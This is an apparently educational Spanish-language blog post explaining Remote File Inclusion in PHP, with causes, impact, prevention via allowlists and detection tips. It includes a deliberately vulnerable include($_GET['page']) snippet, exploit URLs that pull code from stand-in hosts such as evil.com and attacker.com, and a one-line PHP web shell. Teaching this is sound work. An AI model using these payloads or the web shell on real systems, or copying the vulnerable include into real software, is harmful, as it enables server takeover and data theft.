---
layout: post
title: "RFI (Remote File Inclusion)"
date: 2025-11-30 18:30:00 -0300
categories: [Vulnerabilidad,RFI]
tags: [Vulnerabilidad, RFI, Web]
description: "Vulnerabilidad RFI (Remote File Inclusion)"
---
## Resumen de la Vulnerabilidad

Remote File Inclusion (RFI) es una vulnerabilidad web que permite a un atacante incluir y ejecutar archivos remotos dentro de una aplicación web vulnerable.

Esto ocurre cuando la aplicación carga archivos dinámicamente y no valida correctamente la fuente, permitiendo que se incluya código alojado en un servidor externo controlado por el atacante.

## ¿Qué puede hacer un atacante con RFI?

Un ataque RFI exitoso puede permitir:

- Ejecución remota de código (RCE)

- Control total del servidor web

- Instalación de backdoors

- Robo de información sensible

- Uso del servidor para ataques a terceros

## ¿Por qué ocurre RFI?

RFI ocurre cuando:

- Se usan inclusiones dinámicas de archivos

- El parámetro es controlado por el usuario

- PHP permite inclusiones remotas (allow_url_include habilitado)

- No existe validación ni restricción de rutas

Ejemplo vulnerable:


```bash
include($_GET['page']);
```

## Ejemplo de explotación RFI

**URL vulnerable:**

```bash
http://victima.com/index.php?page=
```

**Payload:**

```bash
http://victima.com/index.php?page=http://evil.com/shell.txt
```

**Contenido del archivo remoto:**

```bash
<?php system($_GET['cmd']); ?>
```

## Payloads comunes


```bash
http://evil.com/shell.txt
https://attacker.com/backdoor.php
```

## Cómo prevenir RFI

**Buenas prácticas**

- Deshabilitar allow_url_include

- No usar inclusiones dinámicas basadas en input del usuario

- Validar estrictamente rutas de archivos

- Usar listas blancas

- Configurar permisos mínimos

Ejemplo seguro:


```bash
$allowed = ['home.php', 'about.php'];
if (in_array($_GET['page'], $allowed)) {
include($_GET['page']);
}
```

## Cómo detectar RFI en pentesting

- Revisar parámetros de inclusión

- Probar URLs externas

- Analizar configuración PHP

Usar herramientas como:

- Burp Suite

- OWASP ZAP

## Severidad

- Alta

- Crítica si permite ejecución de código remoto

## Conclusión

La vulnerabilidad Remote File Inclusion (RFI) representa un riesgo crítico para la seguridad de las aplicaciones web, ya que permite a un atacante incluir y ejecutar código remoto directamente en el servidor afectado. Este tipo de falla puede derivar en un compromiso total del sistema, incluyendo la ejecución remota de comandos, la instalación de backdoors y el robo de información sensible.
